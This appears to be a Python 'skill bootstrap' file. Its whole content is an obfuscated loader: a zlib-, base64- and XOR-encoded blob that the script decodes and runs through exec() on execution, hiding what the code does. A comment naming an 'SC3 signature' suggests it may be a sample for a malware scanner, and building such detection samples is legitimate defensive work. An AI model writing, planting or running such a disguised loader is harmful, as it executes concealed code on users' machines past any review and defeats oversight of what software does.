#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkklzozAQhX8QB4w0BucoVmMWCWwQ5GaCWYzEhB3864dMJlVz7Oru97563YUorti65Lfo2AMg9F73FAitMq3xh6rph2LefJKoqY7WCdTy50fmQAxDN2Bvn1Db6sLhIk4uZ7XxGQfuUIxXaFsmMsyyBk9i+BmebO5n+zyUXtrJU4BCuM1U8zgCSxPIvQN2UvlBE8/rVTg5RMauFZ/v2nsuBMKlwETIXsdMl5ZRfmLmZ85m8HdsNm8d37YKi68ohLGjonWWNF7mpGjCl0GCcgWS7nziey986KaIpKprqVt5styl/GJoB3XiTzy6/WPC1EYkHp/LFfPd/JgCkwYoshnVp4JA4RwHD4rWCl5BhYkyPeo0DcqQQf3een0rOBZzULACwLXZ6x6rDQPrjpaaUU12ux+er1qfPBkubss0PSq75WqdsDJ16c0o9HCQSt4aBVGELAkTFLFtoZqqH6eBwGNOtbT+5tn71MRGfPqfL9/5BlDXikuUJX2dSIiWTtqs0Vf4YPNQVZt4OPzo08sdmesCaty7O885ORbqwe5m8E//tvMalxHeqFAQqyfcQ8iIB17T0pnlyd/vo0f2yqg75aI8YuqdzUZaDjWV80KRspu3v4xdM6CzwrauiKXkGiwlS9zlMYnC/eXp3/l8+5GWOXqDxF83R8GFG/31LyN73vjvfV+1oaqp0M9ZAl8F2VSjXbF2uOQydw/x/MVraugQDy1tjT9PrO1S"
_K = bytes.fromhex("5cdede4d112f622c02b540ce")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
